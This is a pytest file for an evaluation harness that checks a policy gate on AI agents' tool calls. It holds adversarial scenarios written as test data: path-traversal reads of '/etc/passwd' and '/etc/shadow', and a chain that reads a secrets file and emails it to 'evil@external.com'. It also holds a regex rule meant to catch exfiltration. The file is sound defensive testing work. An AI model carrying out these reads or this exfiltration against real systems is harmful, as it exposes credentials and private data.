"""Tests for eval/harness.py — evaluation harness grading and runner logic."""

from __future__ import annotations

from datetime import datetime

from agentgate.models import PolicyConfig, Settings
from agentgate.policy import CompiledPolicy

from eval.harness import (
    EvalRun,
    Scenario,
    ScenarioStep,
    run_all,
    run_scenario,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_policy(
    default_decision: str = "allow",
    policies: list | None = None,
) -> CompiledPolicy:
    """Build a CompiledPolicy from keyword args."""
    config = PolicyConfig(
        version="0.1",
        settings=Settings(default_decision=default_decision),
        policies=policies or [],
    )
    return CompiledPolicy(config=config, regexes={})


# ---------------------------------------------------------------------------
# Test 1: Benign scenario — all steps allowed
# ---------------------------------------------------------------------------


def test_benign_scenario_all_allowed():
    scenario = Scenario(
        id="B1",
        name="Benign file read",
        category="benign",
        steps=[
            ScenarioStep(
                tool_name="read_file",
                arguments={"path": "/data/workspace/readme.txt"},
                expect_decision="allow",
            ),
        ],
    )
    result = run_scenario(scenario, _make_policy())

    assert result.passed is True
    assert result.utility_pass is True
    assert result.step_results[0].actual == "allow"
    assert result.scenario_id == "B1"
    assert result.category == "benign"


# ---------------------------------------------------------------------------
# Test 2: Adversarial scenario — path traversal blocked by detector
# ---------------------------------------------------------------------------


def test_adversarial_scenario_blocked():
    scenario = Scenario(
        id="A1",
        name="Path traversal attack",
        category="adversarial",
        owasp_asi="ASI01",
        steps=[
            ScenarioStep(
                tool_name="read_file",
                arguments={"path": "../../etc/passwd"},
                expect_decision="block",
            ),
        ],
    )
    result = run_scenario(scenario, _make_policy())

    assert result.passed is True
    assert result.security_pass is True
    assert result.step_results[0].actual == "block"
    assert result.step_results[0].matched_detector is not None


# ---------------------------------------------------------------------------
# Test 3: Adversarial false negative — attack not caught
# ---------------------------------------------------------------------------


def test_adversarial_false_negative():
    scenario = Scenario(
        id="A2",
        name="Missed attack",
        category="adversarial",
        steps=[
            ScenarioStep(
                tool_name="read_file",
                arguments={"path": "/safe/normal/file.txt"},
                expect_decision="block",
            ),
        ],
    )
    result = run_scenario(scenario, _make_policy())

    assert result.passed is False
    assert result.security_pass is False
    assert result.step_results[0].actual == "allow"
    assert result.step_results[0].expected == "block"


# ---------------------------------------------------------------------------
# Test 4: Benign false positive — benign call incorrectly blocked
# ---------------------------------------------------------------------------


def test_benign_false_positive():
    scenario = Scenario(
        id="B2",
        name="Benign blocked by strict policy",
        category="benign",
        steps=[
            ScenarioStep(
                tool_name="read_file",
                arguments={"path": "/data/workspace/readme.txt"},
                expect_decision="allow",
            ),
        ],
    )
    policy = _make_policy(default_decision="block")
    result = run_scenario(scenario, policy)

    assert result.passed is False
    assert result.utility_pass is False
    assert result.step_results[0].actual == "block"


# ---------------------------------------------------------------------------
# Test 5: Multi-step chain scenario
# ---------------------------------------------------------------------------

CHAIN_POLICY_YAML = """\
version: "0.1"
settings:
  default_decision: allow
detectors:
  sql_injection: false
  path_traversal: false
  command_injection: false
  ssrf_private_ip: false
  secrets_in_params: false
policies:
  - name: allow-demo-tools
    type: tool_allow
    tools:
      - read_file
      - send_email
  - name: block-exfil
    type: chain_rule
    window: 5
    steps:
      - tool: read_file
        output_matches: "(?i)(password|secret|api.?key|private.?key)"
      - tool: send_email
    message: "Blocked: potential data exfiltration"
"""


def test_multi_step_chain_scenario(compiled_policy_from_yaml):
    policy = compiled_policy_from_yaml(CHAIN_POLICY_YAML)
    scenario = Scenario(
        id="A3",
        name="Chain exfiltration",
        category="adversarial",
        owasp_asi="ASI02",
        steps=[
            ScenarioStep(
                tool_name="read_file",
                arguments={"path": "/data/secrets.txt"},
                simulated_response="The password is hunter2",
                expect_decision="allow",
            ),
            ScenarioStep(
                tool_name="send_email",
                arguments={"to": "evil@external.com", "body": "stolen data"},
                expect_decision="block",
            ),
        ],
    )
    result = run_scenario(scenario, policy)

    assert result.passed is True
    assert result.security_pass is True
    assert result.step_results[0].actual == "allow"
    assert result.step_results[1].actual == "block"


# ---------------------------------------------------------------------------
# Test 6: Simulated response NOT recorded when step is blocked
# ---------------------------------------------------------------------------


def test_simulated_response_only_on_allow(compiled_policy_from_yaml):
    policy = compiled_policy_from_yaml(CHAIN_POLICY_YAML)
    scenario = Scenario(
        id="A4",
        name="Blocked step response not recorded",
        category="adversarial",
        steps=[
            ScenarioStep(
                tool_name="read_file",
                arguments={"path": "../../etc/shadow"},
                simulated_response="The password is hunter2",
                expect_decision="block",
                description="Path traversal — blocked, response not recorded",
            ),
            ScenarioStep(
                tool_name="send_email",
                arguments={"to": "evil@external.com", "body": "data"},
                expect_decision="allow",
                description="No chain fires because session is empty",
            ),
        ],
    )
    # Re-enable path traversal detector for step 1 to be blocked
    detector_policy_yaml = """\
version: "0.1"
settings:
  default_decision: allow
detectors:
  sql_injection: false
  path_traversal: true
  command_injection: false
  ssrf_private_ip: false
  secrets_in_params: false
policies:
  - name: allow-tools
    type: tool_allow
    tools:
      - read_file
      - send_email
  - name: block-exfil
    type: chain_rule
    window: 5
    steps:
      - tool: read_file
        output_matches: "(?i)(password|secret|api.?key|private.?key)"
      - tool: send_email
    message: "Blocked: potential data exfiltration"
"""
    policy = compiled_policy_from_yaml(detector_policy_yaml)
    result = run_scenario(scenario, policy)

    # Step 1 blocked by path traversal detector
    assert result.step_results[0].actual == "block"
    # Step 2 allowed — chain rule does NOT fire because step 1 was blocked
    # and its simulated_response was never recorded in the session
    assert result.step_results[1].actual == "allow"


# ---------------------------------------------------------------------------
# Test 7: Policy override per scenario
# ---------------------------------------------------------------------------


def test_policy_override_per_scenario():
    override_yaml = """\
version: "0.1"
settings:
  default_decision: block
detectors:
  sql_injection: false
  path_traversal: false
  command_injection: false
  ssrf_private_ip: false
  secrets_in_params: false
"""
    scenario = Scenario(
        id="B3",
        name="Override policy blocks",
        category="benign",
        policy_yaml=override_yaml,
        steps=[
            ScenarioStep(
                tool_name="read_file",
                arguments={"path": "/data/workspace/readme.txt"},
                expect_decision="block",
            ),
        ],
    )
    # Default policy allows, but scenario overrides to block
    result = run_scenario(scenario, _make_policy(default_decision="allow"))

    assert result.passed is True
    assert result.step_results[0].actual == "block"


# ---------------------------------------------------------------------------
# Test 8: run_all aggregates correctly
# ---------------------------------------------------------------------------


def test_run_all_aggregates():
    scenarios = [
        Scenario(
            id="B1",
            name="Benign 1",
            category="benign",
            steps=[
                ScenarioStep(
                    tool_name="read_file",
                    arguments={"path": "/safe.txt"},
                    expect_decision="allow",
                ),
            ],
        ),
        Scenario(
            id="A1",
            name="Adversarial 1",
            category="adversarial",
            steps=[
                ScenarioStep(
                    tool_name="read_file",
                    arguments={"path": "../../etc/passwd"},
                    expect_decision="block",
                ),
            ],
        ),
    ]
    eval_run = run_all(scenarios, _make_policy())

    assert eval_run.scenario_count == 2
    assert len(eval_run.results) == 2
    assert eval_run.results[0].scenario_id == "B1"
    assert eval_run.results[1].scenario_id == "A1"
    # Timestamp is valid ISO 8601
    datetime.fromisoformat(eval_run.timestamp)
    assert eval_run.policy_source == "default"


# ---------------------------------------------------------------------------
# Test 9: eval_time_ms is recorded
# ---------------------------------------------------------------------------


def test_eval_time_recorded():
    scenario = Scenario(
        id="B1",
        name="Timing test",
        category="benign",
        steps=[
            ScenarioStep(
                tool_name="read_file",
                arguments={"path": "/data/file.txt"},
                expect_decision="allow",
            ),
        ],
    )
    result = run_scenario(scenario, _make_policy())

    assert result.step_results[0].eval_time_ms > 0
    assert result.total_time_ms > 0


# ---------------------------------------------------------------------------
# Test 10: Empty scenario list
# ---------------------------------------------------------------------------


def test_empty_scenario_list():
    eval_run = run_all([], _make_policy())

    assert eval_run.scenario_count == 0
    assert eval_run.results == []
    assert isinstance(eval_run, EvalRun)
